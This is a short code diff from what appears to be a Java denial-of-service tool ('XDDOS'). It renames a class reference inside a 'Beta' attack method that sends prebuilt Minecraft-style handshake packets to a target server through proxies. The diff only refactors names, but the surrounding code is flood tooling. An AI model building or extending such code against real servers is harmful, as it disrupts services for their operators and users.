@@ -2,7 +2,7 @@ package XD.XDDOS.methods;
 
 import java.io.IOException;
 
-import XD.XDDOS.Main;
+import XD.XDDOS.XDDOS;
 import XD.XDDOS.NettyBootstrap;
 import XD.XDDOS.ProxyLoader;
 import XD.XDDOS.utils.Handshake;
@@ -15,7 +15,7 @@ import io.netty.channel.Channel;
 public class Beta 
 implements Method{
     
-    private byte[] handshake = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2)).getWrappedPacket();
+    private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();
 
     public void accept(Channel channel, ProxyLoader.Proxy proxy) {
         channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
